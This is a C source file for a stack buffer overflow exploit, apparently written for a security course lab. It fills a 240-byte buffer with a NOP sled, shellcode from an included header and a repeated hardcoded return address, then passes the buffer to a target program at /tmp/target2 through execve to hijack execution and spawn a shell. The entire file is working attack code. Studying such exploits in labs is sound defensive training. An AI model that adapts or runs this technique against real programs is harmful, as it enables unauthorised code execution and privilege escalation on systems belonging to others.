#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
  env[0] = NULL;

  int buff_size = 240; 

  char *buff; // The input we pass to break target2

  if (!(buff = malloc(buff_size))) {
    fprintf(stderr, "Can't allocate memory.\n");
    exit(EXIT_FAILURE);
  }

  char *ret_address = "\xb0\xfc\xff\xbf"; // The new return address pointing into NOP sled
  int shell_len = strlen(shellcode);
  // How many return addresses we put into the buffer
  // Trial and error
  int num_rets = 30;

  int num_nops = buff_size - (shell_len + num_rets * 4); // How many NOPs we put into our input
  int ret_start = num_nops + shell_len; // How many bytes occupied by NOP sled together with shellcode (offset of return address block)

  int i;

  // Add the NOPs to the inputs
  for (i = 0; i < num_nops; i++) {
    buff[i] = NOP;
  }

  // Adding the shellcode
  for (i = num_nops; i < ret_start; i++) {
    buff[i] = shellcode[i-num_nops];
  }

  // Fill the rest with the new return addresses
  for (i = ret_start; i < buff_size; i++) {
    buff[i] = ret_address[(i-ret_start) % 4];
  }

  args[1] = buff;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  free(buff);
  return 0;
}
